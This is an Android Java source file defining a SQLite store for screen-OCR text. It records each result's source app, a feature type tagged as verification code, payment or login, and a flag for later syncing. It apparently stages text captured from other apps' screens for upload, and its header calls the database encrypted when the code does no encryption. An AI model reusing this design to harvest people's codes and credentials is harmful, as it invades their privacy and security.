package com.liuma.app.features.screenocr;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

/**
 * 本地加密数据库存储 OCR 识别结果
 * 字段：timestamp, detectedText, featureType, synced
 */
public class OcrDatabase extends SQLiteOpenHelper {

    private static final String DB_NAME = "screen_ocr.db";
    private static final int DB_VERSION = 1;

    private static final String TABLE_OCR = "ocr_results";
    private static final String COL_ID = "id";
    private static final String COL_TIMESTAMP = "ts";
    private static final String COL_DETECTED_TEXT = "detectedText";
    private static final String COL_FEATURE_TYPE = "featureType";
    private static final String COL_PACKAGE = "pkg";
    private static final String COL_CONFIDENCE = "confidence";
    private static final String COL_SYNCED = "synced";

    private static OcrDatabase instance;

    private OcrDatabase(Context context) {
        super(context.getApplicationContext(), DB_NAME, null, DB_VERSION);
    }

    public static synchronized OcrDatabase getInstance(Context context) {
        if (instance == null) {
            instance = new OcrDatabase(context);
        }
        return instance;
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        db.execSQL("CREATE TABLE " + TABLE_OCR + " ("
            + COL_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, "
            + COL_TIMESTAMP + " INTEGER NOT NULL, "
            + COL_DETECTED_TEXT + " TEXT NOT NULL, "
            + COL_FEATURE_TYPE + " TEXT, "
            + COL_PACKAGE + " TEXT, "
            + COL_CONFIDENCE + " REAL, "
            + COL_SYNCED + " INTEGER DEFAULT 0"
            + ")");
        db.execSQL("CREATE INDEX idx_ocr_synced ON " + TABLE_OCR + "(" + COL_SYNCED + ")");
        db.execSQL("CREATE INDEX idx_ocr_ts ON " + TABLE_OCR + "(" + COL_TIMESTAMP + ")");
        db.execSQL("CREATE INDEX idx_ocr_feature ON " + TABLE_OCR + "(" + COL_FEATURE_TYPE + ")");
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        db.execSQL("DROP TABLE IF EXISTS " + TABLE_OCR);
        onCreate(db);
    }

    /**
     * 插入 OCR 识别结果
     * @param timestamp 时间戳
     * @param detectedText 识别的文字
     * @param featureType 特征类型（如：验证码、支付、登录等）
     * @param pkg 包名
     * @param confidence 置信度
     * @return 插入的行 ID
     */
    public long insert(long timestamp, String detectedText, String featureType, String pkg, float confidence) {
        SQLiteDatabase db = getWritableDatabase();
        ContentValues cv = new ContentValues();
        cv.put(COL_TIMESTAMP, timestamp);
        cv.put(COL_DETECTED_TEXT, detectedText != null ? detectedText : "");
        cv.put(COL_FEATURE_TYPE, featureType != null ? featureType : "");
        cv.put(COL_PACKAGE, pkg != null ? pkg : "");
        cv.put(COL_CONFIDENCE, confidence);
        cv.put(COL_SYNCED, 0);
        return db.insert(TABLE_OCR, null, cv);
    }

    /**
     * 获取未同步的记录
     */
    public List<JSONObject> getUnsynced(int limit) {
        List<JSONObject> list = new ArrayList<>();
        SQLiteDatabase db = getReadableDatabase();
        Cursor c = db.query(TABLE_OCR, null, COL_SYNCED + "=0",
            null, null, null, COL_ID + " ASC", String.valueOf(limit));
        while (c.moveToNext()) {
            try {
                JSONObject obj = new JSONObject();
                obj.put("id", c.getLong(c.getColumnIndexOrThrow(COL_ID)));
                obj.put("ts", c.getLong(c.getColumnIndexOrThrow(COL_TIMESTAMP)));
                obj.put("detectedText", c.getString(c.getColumnIndexOrThrow(COL_DETECTED_TEXT)));
                obj.put("featureType", c.getString(c.getColumnIndexOrThrow(COL_FEATURE_TYPE)));
                obj.put("pkg", c.getString(c.getColumnIndexOrThrow(COL_PACKAGE)));
                obj.put("confidence", c.getFloat(c.getColumnIndexOrThrow(COL_CONFIDENCE)));
                list.add(obj);
            } catch (Exception ignored) {}
        }
        c.close();
        return list;
    }

    /**
     * 标记记录为已同步
     */
    public void markSynced(List<Long> ids) {
        if (ids.isEmpty()) return;
        SQLiteDatabase db = getWritableDatabase();
        StringBuilder placeholders = new StringBuilder();
        String[] args = new String[ids.size()];
        for (int i = 0; i < ids.size(); i++) {
            if (i > 0) placeholders.append(",");
            placeholders.append("?");
            args[i] = String.valueOf(ids.get(i));
        }
        ContentValues cv = new ContentValues();
        cv.put(COL_SYNCED, 1);
        db.update(TABLE_OCR, cv,
            COL_ID + " IN (" + placeholders.toString() + ")", args);
    }

    /**
     * 获取未同步的记录数量
     */
    public int getUnsyncedCount() {
        SQLiteDatabase db = getReadableDatabase();
        Cursor c = db.rawQuery("SELECT COUNT(*) FROM " + TABLE_OCR + " WHERE " + COL_SYNCED + "=0", null);
        int count = 0;
        if (c.moveToFirst()) count = c.getInt(0);
        c.close();
        return count;
    }

    /**
     * 获取历史记录
     */
    public JSONArray getHistory(long since, int limit) {
        JSONArray arr = new JSONArray();
        SQLiteDatabase db = getReadableDatabase();
        Cursor c = db.query(TABLE_OCR, null, COL_TIMESTAMP + ">?",
            new String[]{String.valueOf(since)}, null, null, COL_TIMESTAMP + " DESC",
            String.valueOf(limit));
        while (c.moveToNext()) {
            try {
                JSONObject obj = new JSONObject();
                obj.put("id", c.getLong(c.getColumnIndexOrThrow(COL_ID)));
                obj.put("ts", c.getLong(c.getColumnIndexOrThrow(COL_TIMESTAMP)));
                obj.put("detectedText", c.getString(c.getColumnIndexOrThrow(COL_DETECTED_TEXT)));
                obj.put("featureType", c.getString(c.getColumnIndexOrThrow(COL_FEATURE_TYPE)));
                obj.put("pkg", c.getString(c.getColumnIndexOrThrow(COL_PACKAGE)));
                obj.put("confidence", c.getFloat(c.getColumnIndexOrThrow(COL_CONFIDENCE)));
                arr.put(obj);
            } catch (Exception ignored) {}
        }
        c.close();
        return arr;
    }

    /**
     * 删除已同步的记录
     */
    public void deleteSynced() {
        SQLiteDatabase db = getWritableDatabase();
        db.delete(TABLE_OCR, COL_SYNCED + "=1", null);
    }

    /**
     * 按特征类型查询记录
     */
    public JSONArray getByFeatureType(String featureType, int limit) {
        JSONArray arr = new JSONArray();
        SQLiteDatabase db = getReadableDatabase();
        Cursor c = db.query(TABLE_OCR, null, COL_FEATURE_TYPE + "=?",
            new String[]{featureType}, null, null, COL_TIMESTAMP + " DESC",
            String.valueOf(limit));
        while (c.moveToNext()) {
            try {
                JSONObject obj = new JSONObject();
                obj.put("id", c.getLong(c.getColumnIndexOrThrow(COL_ID)));
                obj.put("ts", c.getLong(c.getColumnIndexOrThrow(COL_TIMESTAMP)));
                obj.put("detectedText", c.getString(c.getColumnIndexOrThrow(COL_DETECTED_TEXT)));
                obj.put("featureType", c.getString(c.getColumnIndexOrThrow(COL_FEATURE_TYPE)));
                obj.put("pkg", c.getString(c.getColumnIndexOrThrow(COL_PACKAGE)));
                obj.put("confidence", c.getFloat(c.getColumnIndexOrThrow(COL_CONFIDENCE)));
                arr.put(obj);
            } catch (Exception ignored) {}
        }
        c.close();
        return arr;
    }
}
